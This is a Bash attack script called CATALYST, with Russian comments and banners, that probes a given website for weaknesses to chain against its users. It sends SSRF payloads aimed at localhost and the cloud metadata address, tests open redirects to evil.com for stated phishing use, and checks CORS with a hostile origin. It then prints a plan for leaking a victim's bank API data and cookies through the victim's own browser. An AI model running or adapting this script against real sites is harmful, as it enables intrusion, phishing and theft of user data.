#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
CAT_DIR="$HOME/.shadow_catalyst/$DOMAIN"
mkdir -p "$CAT_DIR"/{chains,targets,delegated}

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   ⚡ CATALYST — Делегирование атаки                        ║"
echo "║   Мы не атакуем сами. Мы заставляем других атаковать.      ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Идея: используем третьи сервисы для атаки (Legacy-метод, работает через доверие)
echo "[CATALYST] ⚡ Ищу кто может атаковать за нас..."

# 1. SSRF через доверенные сервисы
echo "[CATALYST] 🔍 Проверяю SSRF векторы..."
SSRF_VECTORS=(
    "$TARGET?url=http://127.0.0.1:22"
    "$TARGET?redirect=http://169.254.169.254/"
    "$TARGET/api/proxy?url=http://localhost/admin"
    "$TARGET/fetch?src=http://10.0.0.1/"
    "$TARGET/webhook?callback=http://internal-api/"
)
for vector in "${SSRF_VECTORS[@]}"; do
    curl -sk --max-time 3 "$vector" -o "$CAT_DIR/targets/ssrf_test.txt" -w "  SSRF: %{http_code}\n" 2>/dev/null &
done
wait

# 2. Открытые редиректы (используем для фишинга)
echo "[CATALYST] 🔍 Проверяю открытые редиректы..."
REDIRECT_PAYLOADS=(
    "$TARGET/logout?return_to=https://evil.com"
    "$TARGET/redirect?to=https://evil.com"
    "$TARGET/exit?url=https://evil.com"
    "$TARGET/login?next=https://evil.com"
)
for redirect in "${REDIRECT_PAYLOADS[@]}"; do
    curl -sk --max-time 3 -L "$redirect" -o "$CAT_DIR/targets/redirect_test.txt" -w "  Redirect: %{http_code} → %{url_effective}\n" 2>/dev/null &
done
wait

# 3. CORS проверка (используем чужие браузеры)
echo "[CATALYST] 🔍 Проверяю CORS..."
curl -sk --max-time 3 \
    -H "Origin: https://evil.com" \
    -H "Access-Control-Request-Method: GET" \
    "$TARGET/api" -o "$CAT_DIR/targets/cors_test.txt" -w "  CORS: %{http_code}\n" 2>/dev/null

# 4. Поиск доверенных доменов для делегирования
echo "[CATALYST] 🔍 Ищу доверенных партнёров..."
curl -sk --max-time 5 "$TARGET" -o "$CAT_DIR/targets/index.html" 2>/dev/null
grep -oP 'https?://[^\s"<>]+' "$CAT_DIR/targets/index.html" 2>/dev/null | grep -v "$DOMAIN" | sort -u | head -10 > "$CAT_DIR/targets/third_party_domains.txt"

echo "  Сторонних доменов: $(wc -l < $CAT_DIR/targets/third_party_domains.txt 2>/dev/null || echo 0)"

# 5. Цепочка делегирования
echo ""
echo "[CATALYST] ⚡ Строю цепочку делегирования..."
cat > "$CAT_DIR/chains/delegation_chain.txt" << CHAINEOF
Шаг 1: Открытый редирект на $TARGET → злой сайт
Шаг 2: CORS позволяет запросы от злого сайта
Шаг 3: Браузер жертвы делает запрос к API банка
Шаг 4: Куки жертвы прикрепляются автоматически
Шаг 5: Данные утекают на злой сайт

ИТОГ: Мы не делали запросы. Всё сделал браузер жертвы.
CHAINEOF
cat "$CAT_DIR/chains/delegation_chain.txt"

echo ""
echo "[CATALYST] ⚡ Делегирование готово."
echo "[CATALYST] 📁 $CAT_DIR/"
